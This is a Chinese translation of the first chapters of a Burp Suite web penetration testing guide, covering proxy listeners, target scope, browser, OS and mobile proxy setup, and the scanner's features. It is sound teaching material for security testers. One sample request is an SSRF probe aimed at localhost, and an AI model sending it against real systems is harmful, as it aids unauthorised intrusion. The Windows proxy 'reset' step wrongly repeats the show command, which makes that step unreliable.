# BurpSuite 应用渗透测试实用指南（一）

> 原文：[`annas-archive.org/md5/854BB45B5601AD5131BDF5E0A2CF756B`](https://annas-archive.org/md5/854BB45B5601AD5131BDF5E0A2CF756B)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

Burp Suite 是一套专注于网络应用渗透测试的图形工具。许多安全专业人员广泛使用 Burp Suite 进行网络渗透测试，执行不同的网络级安全任务。

这本书将从介绍网络渗透测试和 Burp Suite 开始。然后，我们将立即深入探讨网络应用安全的核心概念以及如何实现服务，包括蜘蛛模块、入侵者模块等。我们还将涵盖一些高级概念，如为 Burp Suite 编写扩展和宏。

这将成为使用 Burp Suite 进行端到端渗透测试的全面指南。

# 这本书适合谁

如果您有兴趣学习如何使用 Burp 测试网络应用程序和移动应用程序的网络部分，那么这本书就是为您准备的。如果您已经有使用 Burp 的基本经验，并且现在希望成为专业的 Burp 用户，那么这本书就是为了满足您的需求而特别设计的。

# 为了充分利用这本书

要在本书中的示例和示例中工作，您需要以下内容：

+   Burp Suite 专业版

+   一台 PC

# 使用的约定

本书中使用了许多文本约定。

`CodeInText`：表示文本中的代码词、数据库表名、文件夹名、文件名、文件扩展名、路径名、虚拟 URL、用户输入和 Twitter 句柄。这是一个例子：“`secret`变量是用户在注册期间分配的数据。”

代码块设置如下：

```
GET /?url=http://localhost/server-status HTTP/1.1 
Host: example.com 
```

任何命令行输入或输出都以以下形式书写：

```
$ mkdir css
$ cd css
```

**粗体**：表示新术语、重要单词或屏幕上看到的单词。例如，菜单或对话框中的单词会以这样的形式出现在文本中。这是一个例子：“点击 New scan。”

警告或重要说明会出现在这样的形式中。

提示和技巧会以这种形式出现。


# 第一章：配置 Burp Suite

在开始应用程序渗透测试之前，必须准备用于攻击最终应用程序的系统。这涉及配置 Burp Suite 成为各种客户端和流量来源的拦截代理。

与确定目标范围一样，减少我们收集的数据中的噪音非常重要。我们将使用目标白名单技术，并使用 Burp 目标功能来过滤和减少测试现代应用程序可能引入的混乱。

Burp 或 Burp Suite 是用于测试 Web 应用程序安全漏洞的图形工具。该工具是用 Java 编写的，由 Dafydd Stuttard 在 PortSwigger 的名义下创建。Burp Suite 现在由他的公司 PortSwigger 积极开发...

# 了解 Burp Suite

可以从 PortSwigger 网站[`portswigger.net/burp`](https://portswigger.net/burp)下载 Burp 适用于所有主要操作系统。对于 Windows 系统，提供了 x64 位和 x32 位的安装程序。还提供了一个独立的 Java JAR 文件，以便您可以将 Burp 作为便携式应用程序运行。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/7d369b4f-3a56-4e1a-a900-c2096169a0e7.png)

当您启动 Burp Suite 时，您将被提示在开始使用该工具之前设置 Burp 项目的设置。

可用的三个选项如下：

+   临时项目：如果您想要使用 Burp 进行快速检查或不需要保存的任务，请选择此选项并点击“下一步”即可立即开始。

+   磁盘上的新项目：对于良好执行的渗透测试，能够记录和检索作为测试一部分的请求和响应的日志非常重要。此选项允许您在磁盘上创建一个文件，该文件将存储在开始测试时在 Burp 中设置的所有配置数据、请求和响应以及代理信息。可以提供描述性名称以便将来加载此文件。一个良好的经验法则是创建一个提供有关项目本身信息的名称。**ClientName-TypeOfTest-DDMMYYYY**是一个很好的起点。

+   打开现有项目：此选项允许您加载以前使用磁盘上的新项目创建的任何现有项目文件。您可以选择暂停蜘蛛和扫描器模块，以便以非活动状态加载项目。

单击“下一步”将带您到一个页面，您可以选择以前的任何保存配置或继续使用 Burp 默认值。当 Burp 启动时，您还可以选择禁用扩展。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/419fa3bc-0e2c-43de-8f1a-8d8202611b33.png)

单击“启动 Burp”继续。

# 设置代理监听器

要将 Burp 用作应用程序渗透测试工具，必须将其设置为**中间人**（**MITM**）代理。中间人代理位于客户端和服务器之间，并允许用户篡改或丢弃通过的消息。在其最简单的形式中，Burp Suite 是 HTTP(S)流量的中间人代理。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/131b50dc-d01c-4237-93f0-2a4808483d02.png)

默认情况下，Burp 将在本地 IP 的端口`8080`上监听`127.0.0.1`。然而，这可以很容易地更改为系统上任何可用 IP 地址上的任意空闲端口。要做到这一点，请按照以下步骤进行：

1.  导航到代理|选项选项卡。

1.  在代理监听器下，确认“运行”复选框被选中...

# 管理多个代理监听器

如果有必要，Burp Suite 可以提供多个代理监听器接口。这只是意味着 Burp 可以同时在不同端口和不同 IP 地址上启动监听器，每个监听器都有自己的配置和设置。

例如，如果您正在测试的厚客户端应用程序有多个组件，其中一些可以配置为使用代理，而另一些则不能，或者如果其通信端口是硬编码的，或者如果需要捕获来自基于网络的浏览器或服务的流量，那么可以创建多个代理监听器，每个监听器都有自己的配置。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/85c20b00-f3e3-4a70-b5f9-ab9950a521b4.png)

如果需要，您可以通过取消选中接口名称旁边的复选框来禁用代理监听器。接下来，我们将了解非代理感知客户端的工作原理。

# 与非代理感知客户端一起工作

在这种情况下，非代理感知客户端是指发出 HTTP 请求但没有简单方法配置代理选项，或根本没有代理支持的客户端。

非代理感知客户端的常见示例是不使用浏览器代理选项的厚客户端应用程序或浏览器插件。Burp 对隐形代理的支持允许非代理感知客户端直接连接到代理监听器。这允许 Burp 拦截和修改基于目标映射的流量。

从架构上讲，这是通过为非代理感知客户端通信的远程目标设置本地 DNS 条目来实现的。这个 DNS 条目可以在本地 hosts 文件中进行设置，如下所示：

```
127.0.0.1 example.org
```

客户端...

# 在 Burp Suite 中创建目标范围

目标范围设置可以在目标|范围选项卡下找到。这允许您为当前执行的渗透测试配置范围内的目标。

将项目添加到目标范围可以影响 Burp 中各个功能的行为。例如，您可以执行以下操作：

+   您可以设置显示过滤器，仅显示范围内的项目。这在处理使用大量第三方代码的应用程序时非常有用，可在目标|站点地图和代理|历史下找到。

+   Spider 模块仅限于范围内的目标。

+   您可以配置代理仅拦截范围内项目的请求和响应。

+   在 Burp 的专业版中，甚至可以自动启动对范围内项目的漏洞扫描。

基本上有两种添加范围项目的方法。第一种，也是推荐的方法，是从代理历史中获取目标。为此，采取以下方法：

1.  设置浏览器和 Burp 进行通信。

1.  关闭 Burp 中的拦截模式并浏览应用程序。

从主页开始浏览每个链接；登录到经过身份验证的区域并注销；提交每个表单；导航到`robots.txt`中列出的每个路径，以及应用程序站点地图中的每个链接（如果可用）；如果适用，以不同的用户身份访问应用程序（具有相同或不同的权限级别）。

这样做将填充应用程序站点地图，如下图所示：在目标|站点地图选项卡下，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/4666c1e3-f6fc-4993-8dfa-392077b9abe8.png)

一旦在站点地图选项卡中填充了目标和 URL，您可以右键单击任何项目并将该项目添加到范围。这可以通过目标|站点地图或代理|历史选项卡进行。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/274ba2e5-b518-4a6c-9be4-9de76b558302.png)

第二种方法是直接将项目添加到目标|范围选项卡。检查使用高级范围控制以启用范围添加的旧接口，这允许对范围条目进行更精细的控制。

让我们举个例子，为想象中的渗透测试创建我们的范围。假设范围内的应用程序位于`http://mutillidae-testing.cxm/`。使用目标|范围选项卡，我们可以通过设置以下内容将此应用程序和以后的所有 URL 添加到范围：

+   协议：HTTP

+   主机或 IP 范围：`mutillidae-testing.cxm`

+   端口：`⁸⁰$`

+   文件：`^*`

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/97e09fac-9a38-4266-841c-ac8a04e8b631.png)

这将添加端口`80`上使用 HTTP 协议的应用程序和任何 URL 到范围内。

您还可以通过目标|范围页面上的加载按钮加载包含需要在范围内的 URL 列表的文件。此列表必须是由换行符分隔的 URL/目标。大文件可能需要一些时间来加载，Burp 在加载和解析文件后可能会出现冻结的情况，但在文件加载和解析完成后将恢复工作。

# 使用目标排除

就像我们可以在 Burp 中添加范围项目一样，我们也可以添加需要明确设置为超出范围的项目。与范围内项目一样，这可以通过两种方法添加。第一种是通过右键单击上下文菜单从代理|历史记录选项卡添加：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/1db81071-a34b-42c8-8bb4-a3ff32520628.png)

第二个是在目标范围选项卡中的排除范围部分。例如，如果您想要排除`/javascript`目录下的所有子目录和文件，则可以应用以下选项：

+   协议：HTTP

+   主机或 IP 范围：`mutillidae-testing.cxm`

+   端口：`⁸⁰$`

+   文件：`^/javascript/.*`

这将排除`/javascript/`目录下的所有 URL...

# 开始测试前的快速设置

这一部分突出了五个可以在开始测试之前启用/设置/配置的快速设置，以立即提高生产力：

+   **启用服务器响应拦截**：默认情况下，Burp 未配置为拦截服务器响应。但是，可以在代理|选项下的拦截服务器响应选项中启用。启用在请求|被修改时和请求|被拦截时拦截响应。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/d0909a19-a6b0-4649-8297-d618938a9bd0.png)

+   **启用取消隐藏的表单字段并选择突出显示未隐藏字段选项**：这可以在代理|选项|响应修改面板下找到。当浏览一个存储或使用隐藏的 HTML 表单字段来做出应用程序决策的应用程序时，这非常有用。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/6b209fe4-053d-4925-b71b-ddfc2fdee4d8.png)

隐藏字段在页面上可见，并且非常显眼地突出显示，允许您根据需要直接在页面上编辑内容。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/0465181c-b202-406c-b2e3-d9b418416fe3.png)

+   **启用如果超出范围则不将项目发送到代理历史记录或其他 Burp 工具选项**：此选项可以在代理|选项|其他中找到。启用此选项可以防止 Burp 将超出范围的请求和响应发送到代理|历史记录和其他 Burp 工具，如扫描器和目标。这些请求和响应被发送和接收，但不会记录在 Burp 的任何功能集中。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/ca83f3f0-8650-4c7c-9543-fa39a5ce2196.png)

+   **设置发出 Repeater 请求的键盘快捷键**：这是一个非常有用的设置，可以在使用 Burp 的 Repeater 模块时启用，以避免使用鼠标单击“Go”按钮。Burp 已经允许通过代理|历史记录选项卡使用*Ctrl* + *R*将项目发送到 Repeater。使用*Ctrl* + *Shift* + *R*可以切换到 Repeater 窗口。添加一个快捷键以使用 Repeater 发送请求完成了从代理|历史记录中选择项目并将其发送的按键链。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/2ec6be3d-cb51-411a-a07b-d0afcba04527.png)

+   **安排保存状态操作**：Burp 有一个任务调度程序，可以用于某些任务，例如恢复和暂停扫描和爬行。您可以从项目选项|其他|计划任务中打开任务调度程序。

+   任务调度程序支持的关键操作之一是自动保存状态。选择保存状态并单击下一步：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/8ce2e613-f593-4534-bebd-4b820f36b77b.png)

+   1.  选择一个将包含保存状态的文件，并且如果需要，选择仅显示范围内项目复选框，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/c8621b22-0354-47d0-8197-ee9b216b01ae.png)

+   1.  选择何时开始任务和间隔。在繁忙的工作中，每 30 分钟保存一次是一个不错的开始间隔：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/bc7c726c-17fb-4146-b4e3-45c2a80aa62b.png)

+   1.  单击完成以激活计划任务，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/00dc92b7-f83c-4d4e-bb29-5f97ec77a325.png)

# 摘要

在本章中，我们学习了如何准备 Burp Suite 应用程序。我们配置了 Burp Suite，使其成为各种客户端和流量来源的拦截代理。在下一章中，我们将学习如何配置客户端并设置移动设备。


# 第二章：配置客户端和设置移动设备

一旦我们启动并配置了 Burp Suite 以充当所有通信都将发送到目标的代理，我们需要设置客户端以与 Burp 通信，以便通信路径完整。

几乎所有可以与 HTTP/HTTPS 服务器通信的客户端都有设置代理端点的方法。这告诉客户端它需要先将流量发送到代理端点，然后再将其转发到目标。不同的客户端有不同的设置代理设置的方式。一些客户端使用操作系统的代理设置来强制流量的路径。

在本章中，我们将看到如何为各种常见客户端设置代理选项，包括移动设备和传统计算设备。

我们将在本章中涵盖以下主题：

+   设置 Firefox、Chrome 和 Internet Explorer 以与 Burp Suite（HTTP 和 HTTPS）一起使用

+   可以用于管理代理设置的其他浏览器附加组件

+   为不支持代理的客户端设置系统范围的代理

+   设置 Android 和 iOS 以与 Burp Suite 一起使用

# 设置 Firefox 以与 Burp Suite（HTTP 和 HTTPS）一起使用

Firefox 长期以来一直是黑客的最爱。这在很大程度上是因为有大量的附加组件，可以扩展其功能和能力。Firefox 相对于行业中其他浏览器的主要优势之一是其能够使用与操作系统无关的代理设置。

即使操作系统设置了单独的系统代理，也可以设置 Firefox 使用特定代理。这允许使用需要单独代理的各种工具与 Firefox 一起使用，同时确保 Firefox 采用单独的路径。

请记住，包括 Firefox 在内的任何浏览器都没有专门的私人/无痕模式代理设置。

# 设置 Chrome 以与 Burp Suite（HTTP 和 HTTPS）一起使用

Google Chrome 使用系统代理来路由流量，除非使用命令行参数来指定代理服务器。这既可能很麻烦，也可能很有优势，因为您可以在不甚至打开 Chrome UI 的情况下在 Chrome 中设置代理。

要在 Chrome 中设置代理选项，请执行以下步骤：

1.  单击右上角的三个点，然后选择设置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/9d1269d4-8f73-447f-b478-3d4a3b177269.png)

1.  在设置窗口中，键入代理以查找“打开代理设置”选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/8436ee5e-ec83-42d5-8909-7462b05ae495.png)

1.  这将打开 Windows Internet 属性对话框。

1.  单击 LAN 设置以打开设置页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/bf173a88-480c-4502-bab3-a2fa275f0365.png)

1.  输入 Burp Suite 正在运行的系统的端口号和 IP 地址，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/fe84b2ed-0d14-423d-ba9f-9cdf14cf82fc.png)

1.  您还可以单击“高级”来使用不同协议的特定地址。请记住，这是一个系统范围的代理设置。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/67cbd2fa-941e-4c69-87de-1531eb4e6aa0.png)

1.  单击确定以应用设置。

# 在 Linux 上设置 Chrome 代理选项

在 Linux 上，当您尝试设置 Google Chrome 的代理选项时，可能会遇到错误，如下所示：

```
When running Google Chrome under a supported desktop environment, the system proxy settings will be used. However, either your system is not supported or there was a problem launching your system configuration.But you can still configure via the command line. Please see man google-chrome-stable for more information on flags and environment variables.
```

在这种情况下，您可以通过命令行参数指定代理服务器，也可以通过编辑安装 Chrome/Chromium 时创建的`.desktop`文件来指定代理服务器。

启动 Google Chrome 的命令行参数是：

# 设置 Internet Explorer 以与 Burp Suite（HTTP 和 HTTPS）一起使用

Internet Explorer 和 Microsoft Edge 都使用 Windows 系统代理设置作为自己的首选项。

按照这些步骤将帮助您在 Internet Explorer 中设置代理选项：

1.  单击右上角的齿轮图标，然后选择 Internet 选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/4f2abf1e-3e03-42d5-af42-d47da77b8d2e.png)

1.  互联网选项对话框将打开。单击连接|LAN 设置以管理 Internet Explorer 的代理设置。

请记住，这是一个系统范围的代理设置，系统上的大多数程序也会遵循这一设置，特别是如果它们没有自己的代理设置。

# 可用于管理代理设置的其他浏览器附加组件

在 Web 应用程序渗透测试期间，可能会出现需要切换代理设置的情况。有时您可能希望直接连接到互联网，而其他时候可能希望通过 Burp 传输流量。

还有一些情况，您可能希望所有流量都通过 Burp，除了[google.com](http://google.com)之外。在这种情况下，不断切换浏览器的代理设置可能会成为一种不愉快的用户体验。

因此，Firefox 和 Chrome 存在几个附加组件/扩展，允许您通过单击选项来切换浏览器的代理设置到不同的代理。

让我们...

# FoxyProxy for Firefox

在代理管理方面，Firefox 最受欢迎的附加组件是 Eric H Jung 编写的这个巧妙的小附加组件**FoxyProxy**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/4cb568c6-3c9a-49da-81ba-073f4e6e72df.png)

FoxyProxy 允许您创建多个配置文件，可以设置为不同的代理端点，并在需要时随意选择。

这是 Firefox 中创建的多个配置文件的 FoxyProxy 外观。此菜单可作为 Firefox 窗口中的选项使用，可通过单击激活：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/2571f130-696e-4975-bb9d-b10acc138a5e.png)

让我们以设置代理选项的简单示例为例：

1.  使用 Firefox 的`about:addons`页面安装 Firefox 扩展。附加组件名称是**FoxyProxy Standard**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/e90d4456-639b-4f92-8c31-b5900d66ae80.png)

1.  安装完成后，右上角的设置按钮旁边会出现一个小狐狸图标。

1.  单击 FoxyProxy 图标，然后选择选项。

1.  单击**添加**以打开添加新代理的页面。

1.  添加描述您的 Burp 代理端点的所有详细信息。还要选择一个颜色。这是代理使用时狐狸图标将变成的颜色：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/af8d2640-7b8d-4faa-b887-1d6be5039f87.png)

1.  新创建的代理将出现在可用代理配置文件列表中。

1.  单击狐狸图标以选择您的代理。您可以通过查看 Burp 中的流量来验证是否有效：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/4f316087-b812-4b66-8e25-06df57e3f9ce.png)

1.  要关闭代理并使用 Firefox 的默认选项（无代理），请选择关闭 FoxyProxy。

当涉及过滤域名甚至 URL 时，此附加组件非常强大。您可以添加匹配或不匹配的模式，并且只会导致特定域的流量通过 FoxyProxy，最终通过 Burp。

# Proxy SwitchySharp for Google Chrome

这是一个很棒的附加组件，可以在 Chrome 运行时轻松切换代理，特别是如果系统代理不是您想要发送网页流量的地方。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/233f6f15-0171-4b8e-9a64-9649165dfd0c.png)

这是 Google Chrome 中创建的多个配置文件的 SwitchySharp 外观。此菜单可作为 Google Chrome 窗口中的选项使用，可通过单击激活：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/5cd78e19-f4c8-4f9c-a077-6d6c0cc505a6.png)

1.  要开始使用这个附加组件，请通过 Chrome 网上商店安装它[`chrome.google.com/webstore/category/extensions`](https://chrome.google.com/webstore/category/extensions)：

# 为不支持代理的客户端设置系统范围的代理

在这种情况下，不支持代理的客户端是指通过 HTTPS 与互联网通信但没有设置代理服务器选项以便捕获流量的应用程序。这些应用程序使用系统代理设置。这在 Windows 上的厚客户端应用程序中很常见。

在这种情况下，我们可以设置系统范围的代理设置以与我们的应用程序配合使用。可以通过命令行和 GUI 设置系统范围的代理设置。但是，了解命令行选项可以让您编写脚本，以便您可以使用 bash 脚本或批处理文件切换系统范围的代理设置，具体取决于您所在的操作系统。

# Linux 或 macOS X

要在 Linux 命令行上使用代理，必须设置环境变量`http_proxy`、`https_proxy`或`ftp_proxy`，具体取决于流量类型。

为了有效地执行此操作，必须运行以下命令：

```
$ export http_proxy=http://127.0.0.1:8080$ export https_proxy="https:// 127.0.0.1:8080"$ export ftp_proxy="http:// 127.0.0.1:8080"
```

您可以通过`env`命令检查当前的代理设置：

```
env | grep -i proxy
```

# Windows

可以通过 Internet 选项|连接|LAN 设置应用 Windows 系统范围的代理设置。也可以使用 netsh 命令应用此设置，如以下步骤所示：

1.  以管理员身份启动 cmd

1.  运行`netsh winhttp set proxy 127.0.0.1:8080`

1.  要检查设置是否已应用，请运行以下命令：

```
netsh winhttp show proxy
```

1.  要重置代理，请运行：

```
netsh winhttp show proxy
```

# 设置 Android 与 Burp Suite 配合使用

要测试 Android 应用程序，甚至通过您的 Android 设备测试 Web 应用程序，您需要配置 Burp 代理以在接口上启动监听器，然后将 Android 设备和运行 Burp 的系统连接到相同的无线网络。

这会使 Burp 监听器对于相同网络上的 Android 设备可见和可访问。

按照以下步骤为您的 Android 设备设置代理：

1.  转到设置菜单。

1.  连接到与 Burp 相同的无线网络。

1.  如果您已连接，请单击无线连接名称，然后选择管理网络设置，如下图所示：

1.  单击“显示高级选项”，显示代理设置。单击...

# 为什么选择 Burp Suite？让我们先了解一些基础知识！

Burp Suite 是一个代理，它允许您拦截和篡改从浏览器到应用服务器的每个请求。这为测试人员提供了巨大的能力，可以对应用程序的所有途径进行渗透测试，因为它显示了所有可用的端点。它起到了中间件的作用。它给您带来的最大优势是能够绕过客户端验证。

它是一个智能工具，可以跟踪您的浏览历史，并管理站点结构，让您更清楚地了解可用的内容以及新发现的途径。Burp 的核心优势在于它允许您将 HTTP 请求转发到不同的 Burp 工具并执行所需的任务。这可能是重复或自动化攻击，解码某些参数，或比较两个或更多不同的请求。Burp 使用户能够在运行时解码参数以理解不同的格式；例如，解码`ViewState`参数，美化 JSON 请求等。

# 设置 iOS 与 Burp Suite 配合使用

要设置 iOS 设备与 Burp 配合使用，我们需要将 Burp 的网络监听器地址（与 Android 设备一样）添加到 iOS 设备的网络配置中。

要实现此目的，请按照以下步骤操作：

1.  在 iOS 设备上，打开设置。

1.  假设您已连接到无线网络，点击 Wi-Fi 选项，然后点击无线接入点名称旁边的信息图标。

1.  在 HTTP PROXY 部分下选择**手动**，并输入 Burp 监听器的 IP 地址和端口号。

1.  返回并浏览 iOS 设备浏览器上的 HTTP 站点，查看流量是否被 Burp 接收。

要能够访问 HTTPS 站点，您需要在 iOS 设备中添加 Burp 的 CA 证书。要...

# 总结

在本章中，我们学习了如何设置 Firefox、Chrome 和 Internet Explorer 通过 Burp Suite 发送和接收 HTTP 和 HTTPS 流量。我们为不支持代理的客户端配置了系统范围的代理设置。我们还了解了使在不同代理之间切换变得轻松的浏览器插件和扩展程序。

在下一章中，我们将学习如何执行应用程序渗透测试。


# 第三章：执行应用程序渗透测试

现在我们已经学会了如何在各种平台上配置和设置我们的 Burp 代理，我们现在可以开始进行应用程序渗透测试。在当今世界，执行渗透测试有各种目的；它可能是为了漏洞赏金，也可能是为了客户进行全面评估。初始方法通常是相同的；然而，最终存在巨大的差异。漏洞赏金猎人的目标是发现一个或一组可能导致严重不利后果的特定漏洞，以便他们可以获得赏金。

另一方面，对于一个完整的渗透测试，渗透测试人员的工作并不止于此。渗透测试人员将不得不执行完整的...

# 漏洞赏金和客户发起的渗透测试之间的区别

在我们深入了解核心细节之前，让我们首先了解这两种思维方式：

+   **漏洞赏金渗透测试思维**：

+   目标是发现具有影响并获得丰厚赏金的漏洞

+   不需要对应用程序进行完整评估

+   一个漏洞足以获得赏金

+   不报告应用程序中的所有漏洞，只报告发现的漏洞

+   没有特定的时间表；可以根据渗透测试人员的方便进行

+   **客户发起的渗透测试思维**：

+   目标是确保测试所有应用程序流程和功能

+   在整个应用程序需要进行审核的有限时间内

+   没有赏金或奖励

+   需要确保扫描器发现的所有漏洞都经过验证并报告

+   还需要确定整个应用程序的范围，了解所有相互依赖关系，并确保端点受到良好的保护，因为有时后端应用程序（如支持）可能不会向漏洞赏金猎人提供，但会在客户发起的评估中提供。

+   **两种思维方式的共同点**：

+   必须有头脑存在，以链接多个漏洞并对基础应用程序造成严重影响

+   还要确保攻击者了解特定应用程序的所有端点

+   确定整个应用程序的存在并测试所有端点以查找缺陷

花点时间思考一下这两种方法之间的区别。我相信您会同意，在执行渗透测试时需要有两种完全不同的思维方式。

# 启动渗透测试

如果不执行以下操作，应用程序渗透测试通常被认为是不完整的：

+   遵循执行侦察的标准方法

+   枚举功能

+   测试单个参数

+   创建测试用例

+   执行非侵入式利用

+   提供关于问题的报告

+   实施重现步骤，概念验证代码和可能的缓解措施

在我的职业生涯中，我多次遇到安全咨询公司或独立专业人士，他们通常运行自动扫描程序，仅检测到少数漏洞，几乎总是无法发现逻辑问题。然后这些漏洞会被利用，但是...

# 类型和特征

Burp Suite 配备了以下一组内置工具，以便于每个渗透测试人员的工作：

+   **扫描器**：帮助自动测试网站的内容和漏洞。它有主动和被动模式，可以由用户切换和配置。

+   **入侵者**：这允许用户对捕获的请求进行某些更改，并通过某些修改自动化任务，通过在每个请求中传递不同的参数值来进行暴力破解。

+   **重复器**：此功能允许用户即时修改标头值并多次向应用服务器发送请求。

+   **协作客户端**：这是 Burp 提供的一个非常有趣的功能。它允许用户检查带外漏洞。这些漏洞非常热门，因为它们不容易找到。

+   **Clickbandit**：此功能允许用户针对易受攻击的应用程序创建**点击劫持**页面。

+   **顺序器**：顺序器功能使用户能够分析应用程序的 cookie 生成机制的随机性；它为用户提供了对会话的随机性或可预测性的非常详细的分析。

+   **解码器**：这允许用户检查任何类型的编码，并允许用户将其解码为纯文本，反之亦然。

+   **比较器**：此功能允许用户比较两个或多个请求的响应，以找出它们之间的差异。

让我们看一下 Burp Suite 的以下低级图表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/0eb70f80-636b-42a1-972c-fba1af176453.png)

您可以在以下三个部分中看到工具的分离：

+   **重建和分析**

+   **漏洞检测和利用**

+   **工具配置**

上图给出了如何处理请求的很好的想法。一旦请求被解析，工具将进行主动的蜘蛛爬行和主动的发现，同时允许用户在重建和分析阶段进行自定义发现。在此过程中，工具会将所有信息主动放入 HTTP 历史记录和站点地图以供以后使用。收集到这些信息后，用户可以将任何特定请求发送到重复器、入侵者或扫描器。扫描器可以在整个网站爬行后进行输入。

工具配置将允许用户管理身份验证、会话处理、任务调度和各种其他任务。代理是 Burp Suite 机制的核心。Burp Suite 扫描器是执行渗透测试的一体化自动化工具包。它可以从发现内容到发现漏洞等一切。还有许多插件可以用来增强扫描结果。我们将在后面的章节中讨论这些插件。Burp 扫描器主要包括两个部分：一个是内容爬行，另一个是审计：

+   **内容爬行**：Burp 爬虫几乎像真实用户一样浏览应用程序；它提交输入、表单，并捕获链接并创建应用程序的完整站点地图。它显示了找到的内容以及未返回响应的内容。

+   **审计**：这是实际的扫描器，将模糊所有参数以确定应用程序中是否存在漏洞。用户可以优化它以获得更好的性能。

现在我们熟悉了 Burp Suite 的类型和功能，我们将深入研究目录应用程序内容的爬行机制。

# 爬行

我想在这里强调一点，Burp 具有惊人的爬行机制，可以以最接近的准确度映射站点结构。爬行可能看起来是一个简单的任务，但对于现代动态应用程序来说并非如此。作为渗透测试人员，我们总是看到扫描器在爬行阶段由于 URL 方案的实现而陷入巨大的循环中，扫描似乎永远无法完成，特别是在测试购物车时。当发生这种情况时，真的很令人沮丧，因为那时你必须依赖完全手动的策略。另一方面，Burp 采取了非常聪明的方法。Burp 的爬虫模拟了用户在浏览器上浏览应用程序的方式。它模拟用户点击、导航和输入提交，...

# 为什么选择 Burp Suite 扫描器？

现在我们已经建立了对 Burp 爬虫的基本理解，是时候了解为什么 Burp 扫描器是任何渗透测试的首选扫描器了。大多数传统扫描器通常会模糊输入字段，检查响应，并确定是否存在漏洞。但是，如果应用程序有某些规则，比如，如果应用程序对每个请求强制执行动态 CSRF 呢？如果应用程序是一个非常动态的应用程序，根据状态为相同的 URL/页面提供不同的内容，或者如果应用程序在发生格式错误的请求时使用户无效呢？不用担心，因为 Burp 已经对此进行了不同处理，并理解了底层逻辑，使我们能够进行优化扫描。

# 审计员/扫描器

让我们继续了解 Burp 审计/扫描规则和机制。Burp 审计器主要分为以下三个核心类别：

+   被动阶段

+   主动阶段

+   JavaScript 分析阶段

这使得 Burp 能够主动发现和利用存储并返回给用户的功能，以响应输入。它还通过以最佳方式处理频繁发生的问题和插入点来避免重复。此外，它通过并行执行工作有效地利用系统资源。

Burp 审计器报告了大量问题，广泛涵盖以下类别：

+   **被动**：这是一种非侵入式的审计，纯粹基于接收到的请求和响应进行分析...

# 了解插入点

Burp 扫描器是一个非常高效的扫描器，因为它针对各种插入点。它针对输入字段、一组头部，如 cookie、引用者、用户代理等。Burp 扫描器通过将有效载荷单独发送到目标来单独分析目标，以查看应用程序如何处理有效载荷。以下是更好地了解插入点的方法：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/077432c3-6153-4588-baa0-f6b01ea0bb0d.png)

Burp 还处理各种参数的数据编码。它了解正在使用的参数以及其后的任何编码。一旦检测到编码，它就会通过对有效载荷进行编码来模糊参数，如下图所示。例如，对于标准输入，它会传递一个正常的有效载荷：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/d1e06ea7-b1a7-4174-b474-8b94d8adced9.png)

对于 JSON 参数，它使用不同的有效载荷进行模糊处理：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/d90588bc-3595-43d1-b284-be8b42cbe2cd.png)

对于 XML，它传递不同的有效载荷：

